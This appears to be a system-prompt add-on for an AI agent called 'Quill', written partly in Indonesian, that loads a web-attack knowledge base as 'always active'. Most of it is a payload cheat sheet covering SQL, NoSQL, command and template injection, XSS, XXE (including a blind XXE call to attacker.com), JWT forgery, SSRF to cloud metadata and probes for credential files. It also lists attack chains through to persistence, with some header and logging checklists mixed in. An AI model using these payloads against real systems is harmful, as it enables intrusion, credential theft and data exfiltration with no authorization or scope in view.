# SUPER CHARGE — Quill Security Expert Boost

## Strategi: High Impact, Low Token Cost

Token cost hanya naik di system prompt load. Per-turn cost tetap sama. Jadi strateginya: **banyak knowledge di system prompt, sedikit di conversation.**

---

## BOOST 1: Enhanced agents.md (sekali load, always active)

### Advanced Attack Patterns — A01-A10

```
A01 INJECTION BYPASS CHEATSHEET:
SQLi Bypass: ' OR 1=1-- | ' OR 'a'='a | admin'-- | 1' AND 1=1--
NoSQLi: {"$ne": null} | {"$gt": ""} | {"$regex": ".*"} | {"$where": "1==1"}
XSS Filter Bypass: <scr<script> | <img src=x onerror=alert(1)> | <svg/onload=alert(1)>
              | <iframe src="javascript:alert(1)"> | <body onload=alert(1)>
              | <input onfocus=alert(1) autofocus> | <select onfocus=alert(1) autofocus>
              | <marquee onstart=alert(1)> | <object data="javascript:alert(1)">
Command Injection: ;ls -la | &&whoami | |cat /etc/passwd | `id` | $(whoami)
SSTI: {{7*7}} | {7*7} | ${{7*7}} | <%= 7*7 %> | {{request.class}}
XPath: ' or '1'='1 | '] | //user | [''=

A02 AUTH BYPASS:
JWT none alg: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.
JWT kid injection: {"kid": "../../../../../dev/null"} 
JWT algorithm confusion: HS256 → RS256
Session fixation: Force session ID, check if session rotates on login
OAuth redirect_uri: http://localhost | https://google.com | https://attacker.com#.evil.com
Password reset: check token predictability, email enumeration
Fake Bearer: Authorization: Bearer anything

A03 SENSITIVE DATA PATTERNS:
Files: .env, .git/config, .git/HEAD, .svn/entries, wp-config.php
       config.php, settings.py, database.yml, secrets.json
       id_rsa, id_dsa, .aws/credentials, .npmrc
       backup.sql, dump.sql, database.sql, data.sql
       debug.log, error.log, access.log
Endpoints: /debug, /actuator, /actuator/env, /actuator/heapdump
           /env, /info, /metrics, /trace, /heapdump
           /server-status, /server-info, /status
           /phpinfo.php, /info.php, /test.php
Error patterns: stack trace, source path, database error, internal IP

A04 XXE PAYLOADS:
Standard: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
SSRF via XXE: <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
Blind XXE: <!ENTITY xxe SYSTEM "http://attacker.com/?$(id)">
Billion Laughs: <!DOCTYPE lol [<!ENTITY l "lol"><!ENTITY l2 "&l;&l;&l;&l;&l;&l;&l;&l;&l;">]>

A05 IDOR PATTERNS:
Param names: id, user_id, account_id, pid, uid, oid, ref, code, key, token
            filter_id, sort_by, page_size, offset, limit, start, end
            role_id, permission_id, type, status, visibility
Horizontal: Change own_id → other_user_id, same privilege level
Vertical: Change role=user → role=admin, privilege escalation
Method swap: GET /admin/users → POST /admin/users → DELETE /admin/users
API versioning: /api/v1/users/1 → /api/v2/users/1

A06 SECURITY HEADERS CHECKLIST:
X-Frame-Options: DENY or SAMEORIGIN (not absent)
X-Content-Type-Options: nosniff (not absent)
X-XSS-Protection: 1; mode=block (not 0)
Content-Security-Policy: (not absent, not unsafe-*)
Strict-Transport-Security: max-age=31536000 (not absent)
Access-Control-Allow-Origin: not "*" for sensitive data
Access-Control-Allow-Credentials: true requires specific origin
Server: should NOT expose version (nginx, Apache, etc)
X-Powered-By: should NOT expose (PHP, ASP.NET, etc)
Cache-Control: no sensitive data cacheable

A07 XSS MUTATION TESTING:
Basic: <script>alert(1)</script>
Event handlers: onerror, onload, onfocus, onblur, onchange, oninput, onsubmit
Tags: <img>, <svg>, <iframe>, <video>, <audio>, <object>, <embed>, <link>
Encoding: < → %3C, > → %3E, " → %22, ' → %27
DOM sources: document.URL, document.referrer, location.href, location.search
DOM sinks: innerHTML, outerHTML, document.write, eval(), setTimeout, setInterval

A08 DESERIALIZATION SIGNS:
PHP: O:8:"stdClass":0:{} | a:1:{i:0;s:4:"test";}
Python: ctypes | pickle.loads() | yaml.load(, Loader=yaml.FullLoader)
Java: rO0ABXNyAB | base64 encoded Serializable objects
Ruby: Marshal.load() | YAML.load()
NodeJS: require('vm').runInThisContext()

A09 CVE LOKASI:
Apache Struts: /struts2-showcase/ | CVE-2017-5638, CVE-2017-9805
ThinkPHP: /?s=index | CVE-2018-20062, CVE-2019-9082
Laravel: /.env | CVE-2017-16894
Jenkins: /jenkins/script | CVE-2018-1000121
Tomcat: /manager/html | CVE-2019-0232
WordPress: /wp-admin/ | CVE-2019-8942
Drupal: /?q=node | CVE-2019-6340

A10 LOGGING GAPS:
No failed auth logging: POST /login with wrong cred → no log entry
No rate limit logging: 100 req/sec → no alert generated
No IP logging: requests not tagged with source IP in logs
No timestamp precision: logs don't include milliseconds
```

---

## BOOST 2: Quick Reference — Common Vulnerability Checklist

### Before Answering (Security Context), Always Check:

**🔴 CRITICAL — Immediate Action:**
- [ ] SQL injection in any user input
- [ ] Authentication bypass (fake token works)
- [ ] Sensitive data exposure (.env, database)
- [ ] Remote Code Execution
- [ ] Broken Access Control (privilege escalation)

**🟡 MEDIUM — Document + Report:**
- [ ] XSS (reflected/dom)
- [ ] CSRF (missing tokens)
- [ ] CORS wildcard
- [ ] Missing security headers
- [ ] Verbose errors / stack traces
- [ ] No rate limiting
- [ ] Default credentials

**🟢 LOW — Note Only:**
- [ ] Information disclosure (version numbers, paths)
- [ ] Cookie without HttpOnly/Secure
- [ ] Cacheable sensitive data
- [ ] Missing Content-Type headers

---

## BOOST 3: Attack Chain Templates

```
RECON → FINGERPRINT → VULN → EXPLOIT → ESCALATE → PERSIST

Chain 1 (Info Disclosure → Auth Bypass):
  sitemap.xml → exposed paths → /actuator/env → AWS keys → API access

Chain 2 (IDOR → Data Theft):
  user profile?user_id=1 → change to user_id=2 → horizontal escalation

Chain 3 (XSS → Session Hijack):
  stored XSS in comment → admin visits page → cookie stolen → account takeover

Chain 4 (SSRF → Cloud Metadata):
  ?url=http://169.254.169.254/ → instance credentials → cloud takeover

Chain 5 (SQLi → Database Dump):
  ' OR 1=1-- → UNION SELECT → extract users table → password cracking
```

---

## BOOST 4: Payload Library (Always Ready)

```
INJECTION:
SQLi: ' OR '1'='1 | admin'-- | 1' UNION SELECT NULL-- | '; DROP TABLE users--
NoSQLi: {"$ne": null} | {"$regex": ".*"} | {"$where": "function(){}"}
XSS: <script>alert(1)</script> | <img src=x onerror=alert(1)> | <svg/onload=alert(1)>
CMD: ; ls -la | && whoami | | cat /etc/passwd | `id`
SSTI: {{7*7}} | ${7*7} | {*7}

AUTH:
JWT none: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.
Basic: Authorization: Basic YWRtaW46YWRtaW4=
Bearer fake: Authorization: Bearer fake_token_12345
API Key fake: X-API-Key: anything

SSRF:
http://localhost/ | http://127.0.0.1/ | http://169.254.169.254/ | file:///etc/passwd

PROTOTYPE POLLUTION:
__proto__[admin]=true | constructor.prototype.polluted=true
```

---

## BOOST 5: Testing Checklist Per Endpoint

```
CHECKLIST:
1. HTTP Method: GET, POST, PUT, DELETE, PATCH, OPTIONS
2. Params: All combinations of param names and values
3. Headers: Auth, Content-Type, Custom headers
4. Injection: SQLi, NoSQLi, XSS, CMD, LDAP, XPath
5. IDOR: Change own ID → other ID (horizontal + vertical)
6. Auth: Fake tokens, session fixation, JWT manipulation
7. Rate Limit: 50+ rapid requests
8. Sensitive Data: .env, .git, backup files
9. Error: Trigger 500, check stack trace exposure
10. Security Headers: All 6 headers check
11. CORS: Wildcard origin check
12. Cookies: HttpOnly, Secure, SameSite flags
13. XXE: XML payload if XML accepted
14. Deserialization: Pickle/PHP serialized payloads
15. Business Logic: Workflow bypass, race conditions
```

---

## BOOST 6: Fast Triage Framework

```
FIRST SCAN (< 5 minutes per target):
1. curl -I [target] → check what's accessible
2. curl [target]/robots.txt → interesting paths
3. curl [target]/sitemap.xml → full structure
4. curl [target]/.env → sensitive files
5. ffuf / dirb for directory enumeration
6. nuclei -t /opt/nuclei-templates/ for CVE detection

QUICK VULN CHECK:
- /api/* with no auth → 200 OK
- /actuator/env → AWS keys + config
- /debug → stack traces
- /login with fake creds → accepts
- Request with <script> in param → reflected as-is
- 100+ rapid requests → no block

HIGH CONFIDENCE FINDINGS:
✓ No auth + sensitive data returned = CONFIRMED
✓ Fake Bearer token accepted = CONFIRMED  
✓ SQLi payload in URL → DB error or different response = CONFIRMED
✓ CORS * with credentials = CONFIRMED
✓ Missing HttpOnly on session cookie = CONFIRMED
```

---

_This is your operational knowledge base. Always active._